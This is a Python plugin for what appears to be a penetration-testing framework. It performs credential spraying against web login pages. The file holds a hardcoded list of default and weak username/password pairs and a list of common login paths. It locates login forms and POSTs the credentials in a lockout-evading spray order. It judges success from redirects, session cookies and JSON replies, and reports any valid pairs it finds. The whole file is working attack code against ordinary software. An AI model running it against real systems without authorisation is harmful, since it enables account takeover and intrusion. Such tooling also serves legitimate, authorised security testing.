"""Enhanced credential spray — password spray with expanded wordlist."""

from __future__ import annotations

import asyncio
import logging
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)

TOP_CREDENTIALS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("admin", "12345678"), ("admin", "qwerty"),
    ("admin", "abc123"), ("admin", "password1"), ("admin", "1234"),
    ("admin", "letmein"), ("root", "root"), ("root", "toor"),
    ("root", "password"), ("root", "123456"), ("administrator", "admin"),
    ("user", "user"), ("test", "test"), ("demo", "demo"),
    ("guest", "guest"), ("operator", "operator"),
    # CMS-specific
    ("admin", "wordpress"), ("admin", "drupal"), ("admin", "joomla"),
    ("admin", "bitrix"), ("admin", "magento"),
    # Service-specific
    ("tomcat", "s3cret"), ("tomcat", "tomcat"), ("manager", "manager"),
    ("admin", "changeme"), ("admin", "changeit"),
    # Russian locale
    ("admin", "Пароль1"), ("admin", "Qwerty123"), ("admin", "Aa123456"),
    ("admin", "P@ssw0rd"), ("admin", "Welcome1"),
    # Grafana/Jenkins/etc
    ("admin", "grafana"), ("admin", "jenkins"), ("admin", "monitor"),
    ("admin", "secret"), ("admin", "master"),
    # Numeric
    ("admin", "111111"), ("admin", "000000"), ("admin", "654321"),
    ("admin", "1q2w3e"), ("admin", "q1w2e3r4"),
    # Common patterns
    ("support", "support"), ("info", "info"), ("sales", "sales"),
    ("service", "service"), ("backup", "backup"),
]

LOGIN_PATHS = [
    "/login", "/admin/login", "/admin", "/wp-login.php",
    "/user/login", "/account/login", "/auth/login", "/signin",
    "/api/login", "/api/auth", "/api/v1/login", "/auth",
]

SUCCESS_INDICATORS = [
    "dashboard", "welcome", "logout", "profile", "my-account",
    "wp-admin", "admin/index", "panel",
]


class CredentialSprayPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="credential_spray",
        display_name="Credential Spray",
        category=PluginCategory.PENTESTING,
        description="Enhanced credential spray with password spray strategy and lockout detection",
        depends_on=["admin_finder"],
        produces=["credential_spray_findings"],
        timeout=120.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available"
            )

        findings: list[Finding] = []
        from basilisk.utils.http_check import resolve_base_url

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"credential_spray": {}},
            )

        # Collect login URLs from pipeline state + defaults
        login_urls: list[str] = []

        # From admin_finder
        admin_data = ctx.state.get("admin_paths", [])
        if isinstance(admin_data, list):
            for item in admin_data:
                if isinstance(item, dict):
                    path = item.get("path", item.get("url", ""))
                elif isinstance(item, str):
                    path = item
                else:
                    continue
                if path:
                    login_urls.append(f"{base_url}{path}" if path.startswith("/") else path)

        # Add default login paths
        for path in LOGIN_PATHS:
            url = f"{base_url}{path}"
            if url not in login_urls:
                login_urls.append(url)

        # Find actual login forms
        active_login_urls: list[str] = []
        for url in login_urls[:20]:
            if ctx.should_stop:
                break
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(url, timeout=5.0)
                    if resp.status == 200:
                        body = await resp.text(encoding="utf-8", errors="replace")
                        if (
                            "password" in body.lower()
                            and ("login" in body.lower() or "sign" in body.lower()
                                 or "<form" in body.lower())
                        ):
                            active_login_urls.append(url)
            except Exception as e:
                logger.debug("credential_spray: %s", e)
                continue

        if not active_login_urls:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("No login forms found for credential spray")],
                data={"credential_spray": {"urls_checked": len(login_urls)}},
            )

        spray_data: dict = {
            "login_forms": len(active_login_urls),
            "tested": 0,
            "found": [],
        }

        # Password spray mode: try each password across all usernames first
        # This avoids triggering per-user lockout
        spray_order: list[tuple[str, str]] = []

        # Group by password for spray pattern
        password_groups: dict[str, list[str]] = {}
        for username, password in TOP_CREDENTIALS:
            if password not in password_groups:
                password_groups[password] = []
            if username not in password_groups[password]:
                password_groups[password].append(username)

        for password, usernames in password_groups.items():
            for username in usernames:
                spray_order.append((username, password))

        for login_url in active_login_urls[:5]:
            found = await self._spray_endpoint(
                login_url, spray_order, ctx, findings, spray_data,
            )
            if found:
                break

        if not spray_data["found"]:
            findings.append(Finding.info(
                f"Credential spray: no valid credentials ({spray_data['tested']} attempts "
                f"on {len(active_login_urls)} forms)",
                tags=["pentesting", "brute", "spray"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"credential_spray": spray_data},
        )

    async def _spray_endpoint(
        self, login_url: str, creds: list[tuple[str, str]],
        ctx, findings: list[Finding], spray_data: dict,
    ) -> bool:
        """Spray credentials against a single login endpoint."""
        consecutive_same = 0
        last_status = -1
        lockout_detected = False

        for username, password in creds:
            if lockout_detected:
                break

            spray_data["tested"] += 1

            # Rate limit: ~3 attempts per second
            await asyncio.sleep(0.33)

            try:
                async with ctx.rate:
                    resp = await ctx.http.post(
                        login_url,
                        data={
                            "username": username, "login": username,
                            "password": password, "passwd": password,
                        },
                        timeout=10.0,
                        allow_redirects=False,
                    )
            except Exception as e:
                logger.debug("credential_spray: %s", e)
                continue

            # Check for success
            is_success = False

            # Redirect to authenticated area
            if resp.status in (302, 303):
                location = resp.headers.get("Location", "").lower()
                if any(ind in location for ind in SUCCESS_INDICATORS):
                    is_success = True

            # Cookie-based auth
            cookies = resp.headers.getall("Set-Cookie", [])
            auth_cookies = [
                c for c in cookies
                if any(
                    kw in c.lower()
                    for kw in ("session", "token", "auth", "logged", "jwt")
                )
            ]
            if auth_cookies and resp.status in (200, 302, 303):
                # Need to check redirect target or response body
                if resp.status in (302, 303):
                    is_success = True
                elif resp.status == 200:
                    body = await resp.text(encoding="utf-8", errors="replace")
                    if any(ind in body.lower() for ind in SUCCESS_INDICATORS):
                        is_success = True

            # JSON response success
            if resp.status == 200 and not is_success:
                ct = resp.headers.get("Content-Type", "")
                if "json" in ct:
                    body = await resp.text(encoding="utf-8", errors="replace")
                    if '"success":true' in body or '"success": true' in body:
                        is_success = True

            if is_success:
                spray_data["found"].append({
                    "url": login_url, "username": username, "password": password,
                })
                findings.append(Finding.critical(
                    f"Valid credentials found: {username}:{password}",
                    description=f"Login successful at {login_url}",
                    evidence=(
                        f"URL: {login_url}\n"
                        f"Credentials: {username}:{password}\n"
                        f"Status: {resp.status}"
                    ),
                    remediation=(
                        "Change default/weak credentials immediately. "
                        "Implement account lockout and 2FA."
                    ),
                    tags=["pentesting", "credentials", "spray"],
                ))
                return True

            # Lockout detection: 3+ consecutive identical status (403/429)
            if resp.status == last_status:
                consecutive_same += 1
            else:
                consecutive_same = 0
                last_status = resp.status

            if consecutive_same >= 3 and resp.status in (403, 429):
                lockout_detected = True

        return False
